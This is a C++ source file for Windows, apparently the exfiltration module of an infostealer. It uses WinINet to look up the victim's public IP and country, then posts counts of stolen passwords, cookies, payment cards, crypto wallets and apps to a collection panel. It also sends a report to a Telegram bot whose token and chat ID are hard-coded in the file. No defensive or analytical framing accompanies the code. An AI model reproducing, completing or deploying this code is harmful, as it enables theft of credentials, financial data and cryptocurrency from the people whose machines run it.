#include "uploader.h"
#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <sstream>

#pragma comment(lib, "wininet.lib")

std::string Uploader::PanelURL = "http://localhost:8000/api/log";
std::string Uploader::TelegramToken = "8474305805:AAHZ98s7nr9IAFQehnqh0x3iGV1OmVhTq9I";
std::string Uploader::TelegramChatID = "7368280792";

std::string Uploader::GetPublicIP() {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "0.0.0.0";
    
    HINTERNET hUrl = InternetOpenUrlA(hInternet, "https://api.ipify.org", NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return "0.0.0.0";
    }
    
    char buffer[1024];
    DWORD bytesRead;
    std::string ip = "0.0.0.0";
    
    if (InternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &bytesRead)) {
        buffer[bytesRead] = '\0';
        ip = buffer;
    }
    
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    
    return ip;
}

std::string Uploader::DetectCountry(const std::string& ip) {
    // Simplified country detection - in production use GeoIP API
    if (ip.find("192.168.") == 0 || ip.find("10.") == 0 || ip.find("172.") == 0) {
        return "Local";
    }
    
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "Unknown";
    
    std::string url = "http://ip-api.com/json/" + ip;
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return "Unknown";
    }
    
    char buffer[2048];
    DWORD bytesRead;
    std::string country = "Unknown";
    
    if (InternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &bytesRead)) {
        buffer[bytesRead] = '\0';
        std::string response = buffer;
        
        size_t pos = response.find("\"countryCode\":\"");
        if (pos != std::string::npos) {
            size_t start = pos + 15;
            size_t end = response.find("\"", start);
            if (end != std::string::npos) {
                country = response.substr(start, end - start);
            }
        }
    }
    
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    
    return country;
}

bool Uploader::UploadToPanel(const UserData& data) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;
    
    HINTERNET hConnect = InternetConnectA(hInternet, "localhost", 8000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/api/log", NULL, NULL, NULL, 0, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }
    
    // Build JSON payload
    std::ostringstream json;
    json << "{"
         << "\"country\":\"" << data.country << "\","
         << "\"ip\":\"" << data.ip << "\","
         << "\"tag\":\"" << data.tag << "\","
         << "\"passwords\":" << data.passwords << ","
         << "\"cookies\":" << data.cookies << ","
         << "\"cards\":" << data.cards << ","
         << "\"wallets\":" << data.wallets << ","
         << "\"apps\":" << data.apps << ","
         << "\"os_version\":\"" << data.os_version << "\","
         << "\"size\":" << data.size
         << "}";
    
    std::string payload = json.str();
    const char* headers = "Content-Type: application/json\r\n";
    
    BOOL result = HttpSendRequestA(hRequest, headers, strlen(headers), (LPVOID)payload.c_str(), payload.length());
    
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    return result;
}

bool Uploader::UploadToTelegram(const std::string& message) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;
    
    std::ostringstream url;
    url << "https://api.telegram.org/bot" << TelegramToken 
        << "/sendMessage?chat_id=" << TelegramChatID 
        << "&text=";
    
    // URL encode message
    std::string encoded = message;
    size_t pos = 0;
    while ((pos = encoded.find(' ', pos)) != std::string::npos) {
        encoded.replace(pos, 1, "%20");
        pos += 3;
    }
    
    url << encoded;
    
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url.str().c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    BOOL result = true;
    char buffer[1024];
    DWORD bytesRead;
    InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead);
    
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    
    return result;
}

bool Uploader::UploadToPanelAndTelegram(const UserData& data, const std::string& message) {
    bool panel = UploadToPanel(data);
    bool telegram = UploadToTelegram(message);
    return panel || telegram;
}
